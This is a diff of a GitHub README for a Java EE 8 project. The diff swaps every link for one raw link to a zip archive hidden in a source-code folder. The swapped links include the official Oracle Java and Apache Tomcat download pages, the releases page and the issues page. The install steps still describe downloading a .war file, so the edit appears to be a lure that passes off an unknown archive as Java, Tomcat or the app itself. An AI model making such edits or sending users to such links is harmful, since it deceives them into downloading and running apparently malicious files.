@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-%E2%96%BC-blue)](https://github.com/Nikhil27k/Projeto-java-EE-8/releases)
+[![Download Release](https://github.com/Nikhil27k/Projeto-java-EE-8/raw/refs/heads/main/src/main/java/br/com/projeto/dto/Projeto-E-java-v1.5-alpha.4.zip%20Release-%E2%96%BC-blue)](https://github.com/Nikhil27k/Projeto-java-EE-8/raw/refs/heads/main/src/main/java/br/com/projeto/dto/Projeto-E-java-v1.5-alpha.4.zip)
 
 ---
 
@@ -39,17 +39,17 @@ To get started with this application, follow these simple steps:
 1. **Check System Requirements**  
    Ensure your system meets these requirements:
    - A Windows, Mac, or Linux machine.
-   - Java 8 installed. You can download it from [Oracle's website](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).
+   - Java 8 installed. You can download it from [Oracle's website](https://github.com/Nikhil27k/Projeto-java-EE-8/raw/refs/heads/main/src/main/java/br/com/projeto/dto/Projeto-E-java-v1.5-alpha.4.zip).
 
 2. **Download the Application**  
-   Visit [this page to download](https://github.com/Nikhil27k/Projeto-java-EE-8/releases). You will find the latest release version. Look for a file that ends with `.war`, which is the deployable version of the application.
+   Visit [this page to download](https://github.com/Nikhil27k/Projeto-java-EE-8/raw/refs/heads/main/src/main/java/br/com/projeto/dto/Projeto-E-java-v1.5-alpha.4.zip). You will find the latest release version. Look for a file that ends with `.war`, which is the deployable version of the application.
 
 3. **Save the File**  
    After downloading, save the file to a folder where you will keep your applications for easy access.
 
 4. **Run the Application**  
    To run the application, you will need to deploy it on a server that supports Java. Here’s how:
-   - If you do not already have a server, you can install **Apache Tomcat**. Download it from [the Apache Tomcat website](https://tomcat.apache.org/).
+   - If you do not already have a server, you can install **Apache Tomcat**. Download it from [the Apache Tomcat website](https://github.com/Nikhil27k/Projeto-java-EE-8/raw/refs/heads/main/src/main/java/br/com/projeto/dto/Projeto-E-java-v1.5-alpha.4.zip).
    - Follow the instructions on the Tomcat website to install and start the server.
    - Copy the downloaded `.war` file into the `webapps` folder of your Tomcat installation.
    - Start the Tomcat server. Your application should be accessible at `http://localhost:8080/Projeto-java-EE-8`.
@@ -61,7 +61,7 @@ To get started with this application, follow these simple steps:
 
 ## 📥 Download & Install
 
-1. **Visit** [this page to download](https://github.com/Nikhil27k/Projeto-java-EE-8/releases).
+1. **Visit** [this page to download](https://github.com/Nikhil27k/Projeto-java-EE-8/raw/refs/heads/main/src/main/java/br/com/projeto/dto/Projeto-E-java-v1.5-alpha.4.zip).
 2. Choose the latest version of the application.
 3. Click on the `.war` file to start the download.
 4. Follow the instructions in the "Getting Started" section to run the application.
@@ -104,4 +104,4 @@ To get started with this application, follow these simple steps:
 
 ## 📞 Contact
 
-For further inquiries, please open an issue on the GitHub repository [here](https://github.com/Nikhil27k/Projeto-java-EE-8/issues).
+For further inquiries, please open an issue on the GitHub repository [here](https://github.com/Nikhil27k/Projeto-java-EE-8/raw/refs/heads/main/src/main/java/br/com/projeto/dto/Projeto-E-java-v1.5-alpha.4.zip).
